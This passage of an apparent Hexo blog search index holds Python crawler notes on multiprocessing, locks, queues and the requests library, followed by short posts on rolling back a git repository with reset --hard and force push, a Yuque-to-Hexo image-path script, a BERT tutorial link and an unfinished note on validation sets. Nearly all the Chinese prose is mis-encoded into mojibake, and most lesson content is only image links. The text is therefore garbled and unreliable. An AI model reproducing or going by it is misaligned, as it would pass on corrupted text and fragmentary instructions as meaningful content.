src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/86.png"></p><h4 id="è®¾ç½®äº’æ–¥é”"><a href="#è®¾ç½®äº’æ–¥é”" class="headerlink" title="è®¾ç½®äº’æ–¥é”"></a>è®¾ç½®äº’æ–¥é”</h4><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/87.png"><br>å°†ä¸‹å›¾<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/88.png"><br>ä¿®æ”¹ä¸º<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/89.png"><br>å³å¯å®ŒæˆåŠ é”</p><h3 id="Pythonå¤šçº¿ç¨‹çš„é—®é¢˜"><a href="#Pythonå¤šçº¿ç¨‹çš„é—®é¢˜" class="headerlink" title="Pythonå¤šçº¿ç¨‹çš„é—®é¢˜"></a>Pythonå¤šçº¿ç¨‹çš„é—®é¢˜</h3><p> ä¸€ä¸ªè¿›ç¨‹ä¸­åªæœ‰ä¸€ä¸ªGILï¼Œå¯¼è‡´æ— æ³•å‘æŒ¥å¤šæ ¸å¹¶è¡Œä¼˜åŠ¿<img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/90.png"></p><h2 id="ç¬¬06è®²-å¤šè·¯åŠ é€Ÿï¼Œäº†è§£å¤šè¿›ç¨‹åŸºæœ¬åŸç†"><a href="#ç¬¬06è®²-å¤šè·¯åŠ é€Ÿï¼Œäº†è§£å¤šè¿›ç¨‹åŸºæœ¬åŸç†" class="headerlink" title="ç¬¬06è®²:å¤šè·¯åŠ é€Ÿï¼Œäº†è§£å¤šè¿›ç¨‹åŸºæœ¬åŸç†"></a>ç¬¬06è®²:å¤šè·¯åŠ é€Ÿï¼Œäº†è§£å¤šè¿›ç¨‹åŸºæœ¬åŸç†</h2><h3 id="è¿›ç¨‹-1"><a href="#è¿›ç¨‹-1" class="headerlink" title="è¿›ç¨‹"></a>è¿›ç¨‹</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/91.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/92.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/93.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/94.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/95.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/96.png"></p><h3 id="å¤šè¿›ç¨‹çš„å®ç°"><a href="#å¤šè¿›ç¨‹çš„å®ç°" class="headerlink" title="å¤šè¿›ç¨‹çš„å®ç°"></a>å¤šè¿›ç¨‹çš„å®ç°</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/97.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/98.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/99.png"><br>æ³¨æ„ï¼šargsåé¢è·Ÿçš„ä¸€å®šæ˜¯<strong>å…ƒç»„</strong><br>è°ƒç”¨startæ–¹æ³•å¯åŠ¨è¿›ç¨‹<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/100.png"><br>å„ä¸ªè¿›ç¨‹ä¹‹é—´çš„æ•°æ®æ˜¯ä¸ä¼šå…±äº«çš„<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/101.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/102.png"><br>æ¥çœ‹ä¸€ä¸ªå®ä¾‹ï¼š<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/103.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/104.png"></p><h3 id="å…¶ä»–åˆ›å»ºè¿›ç¨‹çš„æ–¹å¼"><a href="#å…¶ä»–åˆ›å»ºè¿›ç¨‹çš„æ–¹å¼" class="headerlink" title="å…¶ä»–åˆ›å»ºè¿›ç¨‹çš„æ–¹å¼"></a>å…¶ä»–åˆ›å»ºè¿›ç¨‹çš„æ–¹å¼</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/105.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/106.png"><br>è¿›ç¨‹çš„æ‰§è¡Œé€»è¾‘åœ¨runæ–¹æ³•ä¸­å®ç°<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/107.png"><br>ä¸‰ä¸ªè¿›ç¨‹åˆ†åˆ«æ‰“å°å‡ºäº†2ï¼Œ3ï¼Œ4æ¡ç»“æœ</p><h3 id="å®ˆæŠ¤è¿›ç¨‹"><a href="#å®ˆæŠ¤è¿›ç¨‹" class="headerlink" title="å®ˆæŠ¤è¿›ç¨‹"></a>å®ˆæŠ¤è¿›ç¨‹</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/108.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/109.png"><br>è¿è¡Œç»“æœï¼š<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/110.png"><br>å› ä¸ºä¸»è¿›ç¨‹æ²¡æœ‰åšä»»ä½•äº‹æƒ…ã€‚<br>è¿™æ ·æˆ‘ä»¬å¯ä»¥é˜²æ­¢æ— æ§åˆ¶çš„ç”Ÿæˆå­è¿›ç¨‹ã€‚<br>åŠ ä¸Šjoinæ–¹æ³•å°±å¯ä»¥è®©å­è¿›ç¨‹ç»“æŸäº†ä¸»è¿›ç¨‹å†ç»“æŸã€‚<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/111.png"><br>ä¸ºäº†é˜²æ­¢ä¸»è¿›ç¨‹æ— é™ç­‰å¾…ï¼Œå¯ä»¥ç»™joinæ–¹æ³•åŠ ä¸€ä¸ªè¶…æ—¶å‚æ•°ï¼Œä»£è¡¨æœ€é•¿ç­‰å¾…çš„ç§’æ•°ï¼š<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/112.png"><br>ä»£è¡¨æœ€é•¿ç­‰å¾…1ç§’<br>â€‹</p><h3 id="å…¶ä»–ç»ˆæ­¢è¿›ç¨‹çš„æ–¹æ³•"><a href="#å…¶ä»–ç»ˆæ­¢è¿›ç¨‹çš„æ–¹æ³•" class="headerlink" title="å…¶ä»–ç»ˆæ­¢è¿›ç¨‹çš„æ–¹æ³•"></a>å…¶ä»–ç»ˆæ­¢è¿›ç¨‹çš„æ–¹æ³•</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/113.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/114.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/115.png"><br>æ³¨æ„ï¼šè°ƒç”¨terminateä¹‹åè¦è°ƒç”¨joinæ–¹æ³•ï¼Œæ‰ä¼šç»ˆæ­¢ï¼ˆå› ä¸ºè°ƒç”¨joinä¼šæ›´æ–°è¿›ç¨‹çŠ¶æ€ï¼‰</p><h3 id="è¿›ç¨‹äº’æ–¥é”"><a href="#è¿›ç¨‹äº’æ–¥é”" class="headerlink" title="è¿›ç¨‹äº’æ–¥é”"></a>è¿›ç¨‹äº’æ–¥é”</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/116.png"><br>ä¸åŠ é”çš„å®ä¾‹ï¼š<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/117.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/118.png"></p><h3 id="ä¿¡å·é‡"><a href="#ä¿¡å·é‡" class="headerlink" title="ä¿¡å·é‡"></a>ä¿¡å·é‡</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/119.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/120.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/121.png"><br>å…±äº«é˜Ÿåˆ—<br>ç¼“å†²åŒºçš„ç©ºä½™æ•°<br>ç¼“å†²åŒºçš„å æœ‰æ•°<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/122.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/123.png"><br>ç›´æ¥ç”¨listæ²¡ç”¨ï¼Œä¸åŒè¿›ç¨‹è®¿é—®ä¸åˆ°ï¼Œåªèƒ½ç”¨è¿™ä¸ªQueue<br>è¯•è¯•å¾€Queueé‡Œæ”¾å…¥éšæœºæ•°æ®ï¼Œçœ‹çœ‹æ•ˆæœ<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/124.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/125.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/126.png"><br>è¿™æ ·å°±å¯ä»¥é€šè¿‡Queueå®ç°æ•°æ®å…±äº«äº†</p><h3 id="ç®¡é“"><a href="#ç®¡é“" class="headerlink" title="ç®¡é“"></a>ç®¡é“</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/127.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/128.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/129.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/130.png"></p><h3 id="è¿›ç¨‹æ± "><a href="#è¿›ç¨‹æ± " class="headerlink" title="è¿›ç¨‹æ± "></a>è¿›ç¨‹æ± </h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/131.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/132.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/133.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/134.png"><br>ç”Ÿæˆäº†ä¸€ä¸ªå¤§å°ä¸º3çš„è¿›ç¨‹æ± ï¼Œä¸æŒ‡å®šåˆ™æ ¹æ®å¤„ç†å™¨çš„å†…æ ¸æ•°é‡è‡ªåŠ¨åˆ†é…<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/135.png"><br>æ‰§è¡Œå®Œäº†å‰ä¸‰ä¸ªè¿›ç¨‹æ‰å¼€å§‹ç¬¬å››ä¸ª<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/136.png">â€‹<br>æœ€åç”¨closeæ–¹æ³•å…³é—­è¿›ç¨‹æ± ï¼Œä½¿å…¶ä¸å†æ¥æ”¶æ–°çš„ä»»åŠ¡ï¼Œå†è°ƒç”¨joinæ–¹æ³•è®©ä¸»è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹çš„é€€å‡º</p><h4 id="ç®€åŒ–å†™æ³•"><a href="#ç®€åŒ–å†™æ³•" class="headerlink" title="ç®€åŒ–å†™æ³•"></a>ç®€åŒ–å†™æ³•</h4><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/137.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/138.png"><br>è‡ªåŠ¨åˆ›å»ºè¿›ç¨‹<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/139.png"></p><h2 id="ç¬¬07è®²ï¼šå…¥é—¨é¦–é€‰ï¼Œ-Requests-åº“çš„åŸºæœ¬ä½¿ç”¨"><a href="#ç¬¬07è®²ï¼šå…¥é—¨é¦–é€‰ï¼Œ-Requests-åº“çš„åŸºæœ¬ä½¿ç”¨" class="headerlink" title="ç¬¬07è®²ï¼šå…¥é—¨é¦–é€‰ï¼Œ Requests åº“çš„åŸºæœ¬ä½¿ç”¨"></a>ç¬¬07è®²ï¼šå…¥é—¨é¦–é€‰ï¼Œ Requests åº“çš„åŸºæœ¬ä½¿ç”¨</h2><p>  å­¦ä¹ çˆ¬è™«æœ€åŸºç¡€çš„ä¾¿æ˜¯æ¨¡æ‹Ÿæµè§ˆå™¨å‘æœåŠ¡å™¨å‘å‡ºè¯·æ±‚<br>  åˆ©ç”¨ Pythonç°æœ‰çš„åº“å¯ä»¥éå¸¸æ–¹ä¾¿åœ°å®ç°ç½‘ç»œè¯·æ±‚çš„æ¨¡æ‹Ÿå¸¸è§çš„åº“æœ‰ urllibã€ requests ç­‰</p><h3 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/140.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/141.png"><br>ç”¨ Python å†™çˆ¬è™«çš„ç¬¬ä¸€æ­¥å°±æ˜¯æ¨¡æ‹Ÿå‘èµ·ä¸€ä¸ªè¯·æ±‚ æŠŠç½‘é¡µçš„æºä»£ç è·å–ä¸‹æ¥<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/142.png"><br>   <img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/143.png"></p><h4 id="getè¯·æ±‚"><a href="#getè¯·æ±‚" class="headerlink" title="getè¯·æ±‚"></a>getè¯·æ±‚</h4><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/144.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/145.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/146.png"><br>å¯ä»¥è¿™ä¹ˆå†™ï¼Œä½†æ˜¯ä¸å¤ªå¥½<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/147.png"><br>è¿™ä¹ˆå†™å¥½<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/148.png"><br>ç»“æœï¼š<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/149.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/150.png"><br>è®²jsonæ ¼å¼çš„æ–‡ä»¶ç›´æ¥è½¬æ¢æˆå­—å…¸<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/151.png"></p><h4 id="åŠ ä¸Šæå–ä¿¡æ¯çš„é€»è¾‘"><a href="#åŠ ä¸Šæå–ä¿¡æ¯çš„é€»è¾‘" class="headerlink" title="åŠ ä¸Šæå–ä¿¡æ¯çš„é€»è¾‘"></a>åŠ ä¸Šæå–ä¿¡æ¯çš„é€»è¾‘</h4><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/152.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/153.png"></p><h5 id="æŠ“å–å›¾ç‰‡ç­‰"><a href="#æŠ“å–å›¾ç‰‡ç­‰" class="headerlink" title="æŠ“å–å›¾ç‰‡ç­‰"></a>æŠ“å–å›¾ç‰‡ç­‰</h5><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/154.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/155.png"></p><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/156.png"></p><ul><li>withè¡¨è¾¾å¼å…¶å®æ˜¯try-finallyçš„ç®€å†™å½¢å¼ã€‚ä½†æ˜¯åˆä¸æ˜¯å…¨ç›¸åŒã€‚withæœ¬èº«å¹¶æ²¡æœ‰å¼‚å¸¸æ•è·çš„åŠŸèƒ½ï¼Œä½†æ˜¯å¦‚æœå‘ç”Ÿäº†è¿è¡Œæ—¶å¼‚å¸¸ï¼Œå®ƒç…§æ ·å¯ä»¥å…³é—­æ–‡ä»¶é‡Šæ”¾èµ„æºã€‚</li><li>wbè¡¨ç¤ºäºŒè¿›åˆ¶</li></ul><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/157.png"></p>]]></content>
      
      
      <categories>
          
          <category> TOOLS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git_å›æ»š</title>
      <link href="/2021/07/26/git_%E5%9B%9E%E6%BB%9A/"/>
      <url>/2021/07/26/git_%E5%9B%9E%E6%BB%9A/</url>
      
        <content type="html"><![CDATA[<p><strong>è¿›å…¥æœ¬åœ°é¡¹ç›®æ–‡ä»¶å¤¹</strong></p><ul><li>git init</li><li>git log</li><li>ctrl+zé€€å‡º</li><li>git reset â€“hard 3bfd4447d2333d6cc12ea22cb89265784a9c8954</li><li>git push -f origin master</li></ul><p>â€‹</p>]]></content>
      
      
      <categories>
          
          <category> TOOLS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¯­é›€markdownå›¾ç‰‡è·¯å¾„è½¬æ¢_for_hexo</title>
      <link href="/2021/07/23/%E8%AF%AD%E9%9B%80markdown%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E8%BD%AC%E6%8D%A2_for_hexo/"/>
      <url>/2021/07/23/%E8%AF%AD%E9%9B%80markdown%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E8%BD%AC%E6%8D%A2_for_hexo/</url>
      
        <content type="html"><![CDATA[<p>  å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯goæœ‰é¸¡ï¼åœ¨ä½¿ç”¨è¯­é›€å†™åšå®¢çš„æ—¶å€™ï¼Œå¯¼å‡ºçš„mdæ–‡ä»¶é‡Œçš„å›¾ç‰‡è·¯å¾„å¾€å¾€ä¸èƒ½åœ¨hexoåšå®¢ä¸­æ­£å¸¸ç›´æ¥å±•ç¤ºï¼Œéœ€è¦é€ä¸ªæ›¿æ¢æˆæœ¬åœ°è·¯å¾„æ‰å¯ä»¥æ˜¾ç¤ºï¼Œè¿™å¤ªéº»çƒ¦äº†ï¼<br>  ä¾å™¶ï¼Œç”¨è¿™ä¸ªè„šæœ¬ï¼Œåªè¦ç®€ç®€å•å•çš„ä¸¤æ­¥é…ç½®ï¼Œå°±èƒ½å°†å›¾ç‰‡è·¯å¾„è‡ªåŠ¨è½¬æ¢æˆæœ¬åœ°å›¾ç‰‡è·¯å¾„ï¼<br><strong>ç¤ºä¾‹ï¼š</strong>goæœ‰é¸¡æƒ³æŠŠ Pythonæ­£åˆ™è¡¨è¾¾å¼å…¥é—¨ è¿™ç¯‡åšæ–‡ä»è¯­é›€ä¸Šå¯¼å‡ºåˆ°äº†/hexoblog/source/postsç›®å½•ä¸‹ï¼Œä»–é•¿è¿™æ ·ï¼š<br><img src="/medias/%E8%AF%AD%E9%9B%80markdown%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E8%BD%AC%E6%8D%A2_for_hexo/image.png">ï¼Œ<br>æ–‡ä»¶å†…éƒ¨ï¼š<br><img src="/medias/%E8%AF%AD%E9%9B%80markdown%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E8%BD%AC%E6%8D%A2_for_hexo/image-1.png">ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œé‡Œé¢çš„å›¾ç‰‡é“¾æ¥éƒ½æ˜¯è¯­é›€è‡ªåŠ¨ç”Ÿæˆçš„å›¾ç‰‡é“¾æ¥ï¼Œç°åœ¨goæœ‰é¸¡è¦æŠŠä»–ä»¬è½¬æ¢æˆå¯ä»¥æ”¾åœ¨hexoåšå®¢ä¸Šå±•ç¤ºçš„æœ¬åœ°é“¾æ¥ï¼<br>ç¬¬ä¸€æ­¥ï¼šåœ¨ä¸»é¢˜æ–‡ä»¶å¤¹ä¸‹çš„mediasæ–‡ä»¶å¤¹ä¸‹åˆ›å»ºä¸€ä¸ªå’Œæ¬²è½¬æ¢mdæ–‡ä»¶åŒåçš„æ–‡ä»¶å¤¹ï¼š<br><img src="/medias/%E8%AF%AD%E9%9B%80markdown%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E8%BD%AC%E6%8D%A2_for_hexo/image-2.png"><br>å¹¶å°†å›¾ç‰‡ä»è¯­é›€ä¸Šçš„æ–‡ç« ä¸­æŒ‰é¡ºåºæ‹–è¿›å»ï¼š<img src="/medias/%E8%AF%AD%E9%9B%80markdown%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E8%BD%AC%E6%8D%A2_for_hexo/image-3.png">ï¼Œ<br>å¯ä»¥çœ‹åˆ°å›¾ç‰‡éƒ½è¢«æŒ‰é¡ºåºçš„è‡ªåŠ¨å‘½åäº†ã€‚<br>ç¬¬äºŒæ­¥ï¼šæ‰“å¼€rego_publish.py,ï¼ˆç¬¬ä¸€æ¬¡ä½¿ç”¨éœ€è¦å°†workpathè®¾ç½®ä¸º_postæ–‡ä»¶å¤¹æ‰€åœ¨çš„ç»å¯¹è·¯å¾„ï¼Œè¿™æ ·åç»­ä½¿ç”¨åˆ™æ— éœ€å†æ¬¡è®¾ç½®workpathï¼‰ï¼Œå°†ä¸»å‡½æ•°ä¸­çš„topä¿®æ”¹ä¸ºâ€™Pythonæ­£åˆ™è¡¨è¾¾å¼å…¥é—¨.mdâ€™,ä¹‹åè¿è¡Œï¼Œå¯ä»¥çœ‹åˆ°mdæ–‡ä»¶ä¸­çš„è·¯å¾„éƒ½è¢«æ›¿æ¢æˆäº†æœ¬åœ°è·¯å¾„ï¼š<br><img src="/medias/%E8%AF%AD%E9%9B%80markdown%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E8%BD%AC%E6%8D%A2_for_hexo/image-4.png">ã€‚<br>æ˜¯ä¸æ˜¯å¾ˆæ–¹ä¾¿å‘¢ï¼Ÿæ¥ï¼Œè¯•è¯•çœ‹ï¼</p><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/snowgo/yuque-markdown-_for_hexo">https://github.com/snowgo/yuque-markdown-_for_hexo</a></p>]]></content>
      
      
      <categories>
          
          <category> TOOLS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœ€å¥½çš„BERTæ•™ç¨‹</title>
      <link href="/2021/07/11/%E6%9C%80%E5%A5%BD%E7%9A%84BERT%E6%95%99%E7%A8%8B/"/>
      <url>/2021/07/11/%E6%9C%80%E5%A5%BD%E7%9A%84BERT%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><a href="https://leemeng.tw/attack_on_bert_transfer_learning_in_nlp.html#">https://leemeng.tw/attack_on_bert_transfer_learning_in_nlp.html#</a><br><img src="https://cdn.nlark.com/yuque/0/2021/png/21769886/1625975915070-1c97daa4-06d1-4510-84bb-cd137870ae25.png#clientId=u842dc2cf-55c6-4&from=paste&height=901&id=u0a0564ba&margin=%5Bobject%20Object%5D&name=image.png&originHeight=901&originWidth=1525&originalType=binary&ratio=1&size=3205271&status=done&style=none&taskId=uf4ac3163-6261-4937-a372-7944dbb90b7&width=1525" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éªŒè¯é›†å‚ä¸è®­ç»ƒäº†å—</title>
      <link href="/2021/07/11/%E9%AA%8C%E8%AF%81%E9%9B%86%E5%8F%82%E4%B8%8E%E8%AE%AD%E7%BB%83%E4%BA%86%E5%90%97%EF%BC%9F/"/>
      <url>/2021/07/11/%E9%AA%8C%E8%AF%81%E9%9B%86%E5%8F%82%E4%B8%8E%E8%AE%AD%E7%BB%83%E4%BA%86%E5%90%97%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>ä»ã€Šæœºå™¨å­¦ä¹ ã€‹è¿™æœ¬ä¹¦ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œè®­ç»ƒé›†æ˜¯æ‹¿æ¥è®­ç»ƒæ¨¡å‹å‚æ•°çš„ï¼Œå¯¹äºæ‰€æœ‰çš„è®­ç»ƒé›†ï¼Œè®­ç»ƒä¸€ä¸ªepochä¹‹åï¼Œæˆ‘ä»¬ä¼šç”¨éªŒè¯é›†æ¥æµ‹è¯•ä¸€ä¸‹æ¨¡å‹åœ¨ä¸Šé¢çš„æ€§èƒ½ï¼Œç”±äºè®­ç»ƒé›†å’ŒéªŒè¯é›†çš„ä¸å¯äº¤æ€§ï¼Œæ‰€ä»¥åœ¨éªŒè¯é›†ä¸Šé¢çš„ç»“æœæ˜¯æœ‰å‚è€ƒæ„ä¹‰çš„ã€‚<br>ä½†æ˜¯é‡ç‚¹æ˜¯ï¼š</p><ol><li>éªŒè¯é›†å¹¶æ²¡æœ‰å‚ä¸è®­ç»ƒè¿‡ç¨‹æ¢¯åº¦ä¸‹é™è¿‡ç¨‹çš„ï¼Œç‹­ä¹‰ä¸Šæ¥è®²æ˜¯æ²¡æœ‰å‚ä¸æ¨¡å‹çš„å‚æ•°è®­ç»ƒæ›´æ–°çš„ã€‚</li><li>ä½†æ˜¯å¹¿ä¹‰ä¸Šæ¥è®²ï¼ŒéªŒè¯é›†å­˜åœ¨çš„æ„ä¹‰ç¡®å®å‚ä¸äº†ä¸€ä¸ªâ€œäººå·¥è°ƒå‚â€çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬æ ¹æ®æ¯ä¸€ä¸ªepochè®­ç»ƒä¹‹åæ¨¡å‹åœ¨valid dataä¸Šçš„è¡¨ç°æ¥å†³å®šæ˜¯å¦éœ€è¦è®­ç»ƒè¿›è¡Œearly stopï¼Œæˆ–è€…æ ¹æ®è¿™ä¸ªè¿‡ç¨‹æ¨¡å‹çš„æ€§èƒ½å˜åŒ–æ¥è°ƒæ•´æ¨¡å‹çš„è¶…å‚æ•°ï¼Œå¦‚å­¦ä¹ ç‡ï¼Œbatchsizeç­‰ç­‰ã€‚</li><li>å› 